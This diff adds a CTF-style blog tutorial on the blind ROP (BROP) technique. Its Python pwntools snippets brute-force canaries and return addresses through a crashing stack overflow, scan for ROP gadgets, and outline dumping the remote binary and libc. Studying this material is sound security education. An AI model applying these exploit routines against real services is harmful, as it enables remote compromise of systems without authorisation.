@@ -1,0 +1,168 @@
+---
+layout: post
+title:  "x86_64 Blind Rop"
+date:   2018-07-15 11:22:06 +0100
+tag: pwning
+---
+## Please read the [disclaimer]({{ site.baseurl }}{% link 9.disclamer.md %})
+
+Hoy, in this post I will introduce you to an advanced exploitation technique called `blind rop`, so what is a blind rop?
+
+"The BROP attack makes it possible to write exploits without possessing the target's binary. It requires a stack overflow and a service that restarts after a crash. Based on whether a service crashes or not (i.e., connection closes or stays open), the BROP attack is able to construct a full remote exploit that leads to a shell." [[1]][1]
+
+TL;TR, blind rop is a **technique** used when we can't get our hands on the vulnerable binary.
+I will divide this attack into parts:
+- Looking for a vulnerability.
+- Extracting critical intel like canaries, the return address, OLD stack frame pointer etc... . 
+- Searching for the right rop gadgets.
+- Dumping the binary and libc.
+
+I will illustrate this technique by using a binary rom a capture the flag competition, so let's get started !
+
+# 0) Looking for a vulnerability:
+
+We first start by poking around, our goal is to find a vulnerability **buffer overflow**, **format string vulnerability** ...
+
+![blind_rop_find_vuln0]({{ "/assets/img/blind_rop_find_vuln0.png" | absolute_url }})
+
+After fuzzing the binary, we can find that if we input a large buffer the service crashes and no more "**Bye!**" sadly.
+
+![blind_rop_find_vuln1]({{ "/assets/img/blind_rop_find_vuln1.png" | absolute_url }})
+
+This service has a **buffer overflow** vulnerability ! and the lenght of the buffer is 40 bytes give it more and it crashes.
+
+# 1) Extracting critical intel:
+
+Our next goal is to leak critical intel from the stack, like **canaries** if the binary has a `stack smashing protection`, **the return address**, and **the old stack frame pointer**.
+
+To do so we will have to bruteforce byte by byte, if we receive the "**Bye!**" that means its the correct byte.
+Here is a small snippet of code:
+
+{% highlight python linenos %}
+def bruteforce():
+	for j in range(0, 8*3):
+		for i in range(0, 256):
+			if i == 10: # the service is using a function that stop reading when it hits a new line
+				continue
+			r = remote(host, port, level='ERROR')
+
+			payload = 'A'*40 + data + chr(i)	
+			
+			r.recvuntil('(chocolate/beer/hamburger): ')
+
+			r.send(payload)
+
+			r.recvuntil('are out of stock\n')
+
+			try:
+
+				recved = r.recv(128, timeout=5)
+
+			except Exception:
+				r.close()
+				continue
+
+			if 'Bye!' in recved:
+				data += chr(i)
+				print list(data)
+				r.close()
+				break
+			r.close()
+{% endhighlight %}
+
+
+With this we can extract most information we need
+
+![blind_rop_leaking0]({{ "/assets/img/blind_rop_leaking0.png" | absolute_url }})
+
+
+# 2) Searching for the right rop gadgets:
+
+To build our exploit we will need some important rop gadgets like: `pop rdi;ret` `pop rsi;pop r15;ret` to be able to pass the first 2 arguments to functions.
+
+So our goal is to find those gadgets inside the binary, we can either start our scanning from the binary base, or from the return address.
+The idea is to chain a rop gadget like the following:
+
+`pop_rdi_ret candidate` + `random 8 bytes` + `the original return address`
+
+`pop_rsi__r15_ret candidate` + `random 8 bytes` + `random 8 bytes` + `the original return address`
+
+and use "**Bye!**" as a reference of success !
+
+
+Here is a small snippet of code:
+
+{% highlight python linenos %}
+def find_rops(addr):
+	global data
+	global rops
+
+	while True:
+
+		r = remote(host, port, level='ERROR')
+
+		# for pop rdi ; ret
+		payload = 'A'*40 + canary + ebp + p64(addr) + p64(0) + ret_address
+		# for pop rsi ; pop r15 ; ret
+		payload = 'A'*40 + canary + ebp + p64(addr) + p64(0) + p64(0) + ret_address
+
+		r.recvuntil('(chocolate/beer/hamburger): ')
+
+		r.send(payload)
+
+		r.recvuntil('are out of stock\n')
+
+		try:
+			recved =''
+			recved = r.recv(128, timeout=7)
+			print recved
+		except Exception:
+			addr += 1
+			r.close()
+			continue
+
+		if 'Bye!' in recved:
+			if hex(addr & 0xffff) not in not_rops:
+				rops.append(hex(addr & 0xfff))
+		r.close()
+		addr += 1
+{% endhighlight %}
+
+This gives us 2 lists of candidates, one for `pop rdi;ret`  and another one for `pop rsi;pop r15;ret`.
+Now we have to figure out which ones are the one we need, right?.
+
+# 3) Dumping the binary and libc:
+
+The idea is to bruteforce the binary starting from the return address until we reach the got entry for a function that sends data back to us, like `write`, `send` etc...
+
+To do so, will combine the 2 lists of candidate gadgets, and build a rop chain that send us data.
+Let's illustrate this with some algorithmic:
+
+{% highlight linenos %}
+addr = return_address
+do
+	for pop_rdi in pop_rdi_candididates:
+		for pop_rsi_r15 in pop_rsi_r15_candididates:
+			payload  = "junk for overflowing" 
+			payload += pop_rdi
+			payload += "socket FD to send data back too"
+			payload += pop_rsi_r15
+			payload += "an address to leak, like binary base"
+			payload += " 8 junk bytes"
+			payload += addr
+	addr += 1
+while not receiving any data 
+{% endhighlight %}
+
+After finding the right address for a send function, and the right rop gadgets, we can start **dumping** libc and the binary from memory for future gadgets like `syscall`, `pop rdx` or we can simply call system function from libc.
+
+With all this information, building an exploit is trivial, you can find a copy of the binary [here]({{ "/assets/downloads/brop_binary.zip" | absolute_url }}).
+
+
+
+[pwntools-website]: https://docs.pwntools.com/en/stable
+[0x00sec-website]:  https://0x00sec.org
+[checksec-gitgub]:  https://github.com/slimm609/checksec.sh
+[ROPgadget-gitgub]: https://github.com/JonathanSalwan/ROPgadget
+[libc-database]:    https://libc.blukat.me
+[1]: http://www.scs.stanford.edu/brop/
